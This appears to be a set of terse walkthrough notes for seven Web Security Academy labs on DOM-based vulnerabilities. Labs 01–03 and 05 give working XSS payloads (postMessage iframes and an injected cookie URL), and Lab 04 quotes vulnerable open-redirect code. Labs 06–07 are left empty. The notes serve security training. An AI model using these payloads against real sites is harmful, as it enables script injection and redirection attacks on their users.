# Dom Based Vulnerabilities - Walkthroughs

```mermaid
graph TD
    Root["Dom Based Vulnerabilities"]
    Root --> L0["Lab 01"]
    click L0 href "#lab-01"
    Root --> L1["Lab 02"]
    click L1 href "#lab-02"
    Root --> L2["Lab 03"]
    click L2 href "#lab-03"
    Root --> L3["Lab 04"]
    click L3 href "#lab-04"
    Root --> L4["Lab 05"]
    click L4 href "#lab-05"
    Root --> L5["Lab 06"]
    click L5 href "#lab-06"
    Root --> L6["Lab 07"]
    click L6 href "#lab-07"
```

## Lab 01: DOM XSS using web messages
<a id="lab-01"></a>

Target Goal - Exploit DOM based XSS vulnerability to call the print() function.


## Analysis

<iframe src="https://0ad50028030bfb4d8003768b004c002d.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>', '*')">

---

## Lab 02: DOM XSS using web messages and a JavaScript URL
<a id="lab-02"></a>

Target Goal - Exploit DOM based XSS vulnerability to call the print function.

## Analysis


<iframe src="https://0a540060031e973e80f3264d00fc00b8.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:', '*')">


---

## Lab 03: DOM XSS using web messages and JSON.parse
<a id="lab-03"></a>


Target Goal - Exploit DOM based XSS vulnerability to call the print() function.


## Analysis

<iframe src="https://0a1100160422108f8297609f00c40066.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\": \"load-channel\", \"url\": \"javascript:print()\"}", "*")' >


---

## Lab 04: DOM-based open redirection
<a id="lab-04"></a>

Target Goal - Exploit the DOM-based open redirection vulnerability to redirect the victim to the exploit server.

## Analysis

<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>

returnUrl = /url=(https?:\/\/.+)/.exec(location);
if(returnUrl)
    location.href = returnUrl[1];
else 
    location.href = "/"



url=http(s)://

---

## Lab 05: DOM-based cookie manipulation
<a id="lab-05"></a>

Target Goal - Inject a malicious cookie in the application that exploits an XSS vulnerability and calls the print() function.

## Analysis


<a href='https://0a22008004f2fc9a82bf8ab6002b00f3.web-security-academy.net/product?productId=1'>Last viewed product</a>

<iframe src="https://0a22008004f2fc9a82bf8ab6002b00f3.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="this.src='https://0a22008004f2fc9a82bf8ab6002b00f3.web-security-academy.net/'">

https://0a22008004f2fc9a82bf8ab6002b00f3.web-security-academy.net/product?productId=1&'><script>print()</script>

https://0a22008004f2fc9a82bf8ab6002b00f3.web-security-academy.net/product?productId=1&%27%3E%3Cscript%3Eprint()%3C/script%3E

---

## Lab 06: Exploiting DOM clobbering to enable XSS
<a id="lab-06"></a>

Target Goal - Exploit DOM clobbering in comment functionality to perform an XSS attack and call the alert function.

## Analysis

---

## Lab 07: Clobbering DOM attributes to bypass HTML filters
<a id="lab-07"></a>

Target Goal - Exploit the DOM clobbering vulnerability in the HTMLJanitor library and call the print function.

## Analysis

---

